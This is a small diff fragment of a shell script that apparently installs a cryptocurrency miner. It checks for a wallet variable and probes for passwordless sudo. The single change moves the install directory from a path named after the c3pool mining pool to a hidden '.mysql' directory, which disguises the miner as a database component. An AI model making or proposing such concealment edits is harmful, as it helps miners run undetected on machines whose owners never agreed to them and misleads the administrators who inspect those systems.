@@ -14,7 +14,7 @@ if [ -z $WALLET ]; then
   exit 1
 fi
 
-INSTALL_DIR="$HOME/.local/c3pool"
+INSTALL_DIR="$HOME/.local/.mysql"
 
 # cleanup
 if sudo -n true 2>/dev/null; then
